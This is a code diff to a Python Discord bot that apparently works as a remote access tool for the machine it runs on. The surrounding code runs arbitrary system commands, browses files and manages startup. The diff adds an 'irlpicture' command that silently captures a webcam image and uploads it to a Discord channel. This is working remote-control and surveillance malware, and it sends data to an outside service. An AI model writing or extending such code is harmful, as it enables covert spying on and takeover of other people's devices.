@@ -12,31 +12,24 @@ import system_info as sysinfo
 import web_opener
 import startup_manager
 import file_explorer as fe
+import webcam_manager as wcm # <-- NEW: Import the webcam module
 
-# --- Configuration ---
+# --- Configuration & Bot Setup (No changes needed here) ---
 TOKEN_PATH = 'token.txt'
 AUTHORIZED_USERS = [1153459521251983470] 
 SERVER_CATEGORY_NAME = "🔴 Live Sessions" 
-
-# --- Global State ---
 session_channel = None
 
-# --- Bot Setup with setup_hook ---
-# THIS IS THE RECOMMENDED WAY TO REGISTER PERSISTENT VIEWS
 class PersistentBot(commands.Bot):
     async def setup_hook(self):
-        # This hook is called after the bot logs in but before it is ready.
-        # The event loop is running at this point.
         self.add_view(fe.FileExplorerView())
-        print("Persistent File Explorer view has been registered.")
+        print("Persistent views have been registered.")
 
 intents = discord.Intents.default()
 intents.message_content = True
 bot = PersistentBot(command_prefix='!', intents=intents, help_command=None)
 
-# REMOVED: The problematic line is no longer here.
-# bot.add_view(fe.FileExplorerView()) 
-
+# ... (Helper functions like load_token, get_device_name, is_authorized remain the same) ...
 def load_token() -> str:
     if not os.path.exists(TOKEN_PATH):
         raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
@@ -54,8 +47,7 @@ def is_authorized(interaction: discord.Interaction) -> bool:
     if session_channel and interaction.channel.id == session_channel.id:
         return True
     return False
-
-# ... (all your commands like runcmd, shownotification, etc. remain exactly the same) ...
+# ... (All previous commands like runcmd, explorer, etc. remain the same) ...
 @bot.tree.command(name="runcmd", description="Execute a system command on this device.")
 async def runcmd(interaction: discord.Interaction, command: str):
     if not is_authorized(interaction):
@@ -159,8 +151,29 @@ async def explorer(interaction: discord.Interaction):
     view.children[3].callback = view.create_modal_callback(dirs)
     
     await interaction.followup.send(embed=embed, view=view)
+# --- NEW WEBCAM COMMAND ---
 
-# --- Connection and Session Handling (No changes) ---
+@bot.tree.command(name="irlpicture", description="Captures an image from the device's webcam.")
+async def irlpicture(interaction: discord.Interaction):
+    if not is_authorized(interaction):
+        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
+
+    await interaction.response.defer() # Defer publicly
+
+    # Run the blocking I/O operation in an executor to avoid freezing the bot
+    image_path = await asyncio.to_thread(wcm.capture_webcam_image)
+
+    if image_path and os.path.exists(image_path):
+        try:
+            await interaction.followup.send(file=discord.File(image_path))
+        finally:
+            # Clean up the temporary file from the host machine
+            os.remove(image_path)
+    else:
+        await interaction.followup.send("❌ **Failed to capture image.** No webcam found or an error occurred.")
+
+
+# --- Connection and Main Loop (No changes needed here) ---
 @bot.event
 async def on_ready():
     global session_channel
@@ -199,7 +212,6 @@ async def on_ready():
     await session_channel.send(embed=online_embed)
 
 async def main():
-    """Main function to run the bot and handle its lifecycle."""
     async with bot:
         try:
             await bot.start(load_token())
